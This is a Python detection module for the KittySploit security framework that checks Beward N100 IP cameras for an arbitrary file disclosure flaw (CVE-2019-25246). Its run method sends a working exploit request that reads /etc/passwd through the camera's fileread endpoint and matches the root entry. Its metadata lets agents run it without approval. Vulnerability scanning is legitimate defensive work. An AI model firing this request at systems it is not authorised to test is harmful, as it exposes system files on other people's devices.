#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Beward N100 H."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'BEWARD N100 H.264 VGA IP Camera M2.1.6 - Arbitrary File Disclosure Detection',
        'description': "Beward N100 H.264 VGA IP Camera M2.1.6 contains an authenticated file disclosure vulnerability caused by improper validation of the 'READ.filePath' parameter in fileread script and SendCGICMD API, letting authenticated attackers read arbitrary system files.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'iot', 'camera', 'disclosure', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/46320',
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-25246',
        ],
        'cve': 'CVE-2019-25246',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/operator/fileread?READ.filePath=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="BEWARD N100 H.264 VGA IP Camera M2.1.6 - Arbitrary File Disclosure detected",
                path='/cgi-bin/operator/fileread?READ.filePath=/etc/passwd',
            )
            return True
        return False

